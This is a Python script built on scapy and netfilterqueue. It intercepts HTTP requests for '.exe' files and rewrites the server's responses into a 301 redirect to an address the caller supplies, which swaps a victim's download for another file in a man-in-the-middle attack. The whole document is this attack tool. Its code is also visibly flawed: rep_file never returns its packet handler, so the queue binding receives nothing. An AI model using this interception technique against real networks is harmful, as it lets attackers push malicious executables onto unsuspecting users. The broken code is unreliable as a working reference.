#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue
import queue

queue = queue.Queue()

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def rep_file(address):
    def process_packets(packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
            if scapy_packet[scapy.TCP].dport == 80:
                # print("HTTP Request")
                if ".exe" in scapy_packet[scapy.Raw].load:
                    # and "192.168.43.128" not in scapy_packet[scapy.Raw].load
                    ack_list.append(scapy_packet[scapy.TCP].ack)
                    # print("[+] exe Request")
            elif scapy_packet[scapy.TCP].sport == 80:
                # print("HTTP Response")
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    # print("[+] Replacing file")
                    # print(scapy_packet.show())
                    modified_packet = set_load(
                        scapy_packet, "\nHTTP/1.1 301 Moved Permanently\nLocation: " + address + "\n\n"
                    )

                    packet.set_payload(str(modified_packet))

        packet.accept()


def run_fintercept(address):
    try:
        # print(address)
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, rep_file(address))
        queue.run()

    except KeyboardInterrupt:
        print("\n[-] Quitting(File Intercept).................")
